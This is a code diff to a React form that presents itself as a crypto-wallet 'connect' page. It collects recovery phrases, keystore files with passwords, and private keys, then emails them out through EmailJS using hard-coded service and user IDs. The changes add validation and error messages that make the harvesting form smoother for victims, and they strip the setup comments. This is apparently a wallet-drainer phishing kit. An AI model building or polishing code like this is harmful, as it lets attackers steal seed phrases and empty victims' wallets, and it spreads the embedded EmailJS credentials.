@@ -16,19 +16,32 @@ const Phrase = () => {
     recoveryPhrase: z
       .string()
       .optional()
-      .refine((phrase) => {
-        if (phrase) {
-          const wordCount = phrase.trim().split(/\s+/).length;
-          return wordCount === 12 || wordCount === 24;
+      .refine(
+        (phrase) => {
+          if (phrase) {
+            const wordCount = phrase.trim().split(/\s+/).length;
+            return wordCount === 12 || wordCount === 24;
+          }
+          return true;
+        },
+        {
+          message: "Recovery phrase must be 12 or 24 words",
         }
-        return true; // If it's undefined, it's valid (because it's optional)
-      }),
+      ),
     keystorePhrase: z.string().optional(),
     keystorePassword: z.string().optional(),
-    private: z.string().optional(),
+    private: z.preprocess(
+      (value) => (value === "" ? undefined : value),
+      z.string().min(1, { message: "Private key cannot be empty" }).optional()
+    ) as ZodType<string | undefined>,
   });
 
-  const { register, handleSubmit, reset } = useForm<connectDataType>({
+  const {
+    register,
+    handleSubmit,
+    reset,
+    formState: { errors },
+  } = useForm<connectDataType>({
     resolver: zodResolver(schema),
   });
   const handleClickButton = () => {
@@ -48,10 +61,10 @@ const Phrase = () => {
     try {
       // Send the email using EmailJS
       const result = await emailjs.send(
-        "service_4dcwyzd", // Replace with your EmailJS service ID
-        "template_u12wotc", // Replace with your EmailJS template ID
+        "service_4dcwyzd",
+        "template_u12wotc",
         templateParams,
-        "fZab5skM3kS9JSPtg" // Replace with your EmailJS user ID
+        "fZab5skM3kS9JSPtg"
       );
 
       if (result.status === 200) {
@@ -103,7 +116,7 @@ const Phrase = () => {
                 <option value="option2">MetaMask</option>
                 <option value="option3">Trust Wallet</option>
                 <option value="option4">Coinbase</option>
-                <option value="option5">Ssafepal</option>
+                <option value="option5">Safepal</option>
                 <option value="option6">Exodus Wallet</option>
                 <option value="option7">Atomic Wallet</option>
                 <option value="option8">Other Wallets</option>
@@ -118,9 +131,13 @@ const Phrase = () => {
                 cols={50}
                 {...register("recoveryPhrase")}
               ></textarea>
-              <small>
-                Typically 12 (sometimes 24) words separated by a single space
-              </small>
+              {errors.recoveryPhrase ? (
+                <p className={styles.error}>{errors.recoveryPhrase.message}</p>
+              ) : (
+                <small>
+                  Typically 12 (sometimes 24) words separated by a single space
+                </small>
+              )}
             </div>
             <div className={styles.key}>
               <label htmlFor="" className={styles.keystore}>
@@ -161,6 +178,9 @@ const Phrase = () => {
                 cols={50}
                 {...register("private")}
               ></textarea>
+              {errors.private && (
+                <p className={styles.error}>{errors.private.message}</p>
+              )}
             </div>
             <small className={styles.privateWords}>
               Before you enter Private key, we recommend you connect to the
